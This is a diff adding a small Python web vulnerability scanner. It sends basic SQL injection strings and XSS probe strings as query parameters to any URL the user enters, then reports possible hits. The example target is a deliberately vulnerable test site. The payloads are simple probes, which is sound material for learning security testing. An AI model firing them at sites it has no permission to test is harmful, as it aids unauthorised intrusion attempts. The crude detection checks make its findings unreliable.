@@ -1,0 +1,48 @@
+import requests
+
+# SQL Injection payloads
+sql_payloads = [
+    "' OR '1'='1",
+    "' OR 1=1--",
+    "' OR 'a'='a",
+]
+
+# XSS payloads
+xss_payloads = [
+    "<script>alert(1)</script>",
+    "<img src=x onerror=alert(1)>"
+]
+
+def test_sql_injection(url):
+    print("\n[+] Testing SQL Injection...")
+    for payload in sql_payloads:
+        test_url = f"{url}?id={payload}"
+        response = requests.get(test_url)
+
+        if "sql" in response.text.lower() or "syntax" in response.text.lower():
+            print(f"[!!] Possible SQL Injection detected with payload: {payload}")
+            return
+    print("[-] SQL Injection not detected")
+
+def test_xss(url):
+    print("\n[+] Testing XSS...")
+    for payload in xss_payloads:
+        test_url = f"{url}?search={payload}"
+        response = requests.get(test_url)
+
+        if payload in response.text:
+            print(f"[!!] Possible XSS detected with payload: {payload}")
+            return
+    print("[-] XSS not detected")
+
+def main():
+    print("=== Web Vulnerability Scanner ===")
+    target_url = input("Enter target URL (example: http://testphp.vulnweb.com/listproducts.php): ")
+
+    test_sql_injection(target_url)
+    test_xss(target_url)
+
+    print("\nScan completed.")
+
+if __name__ == "__main__":
+    main()
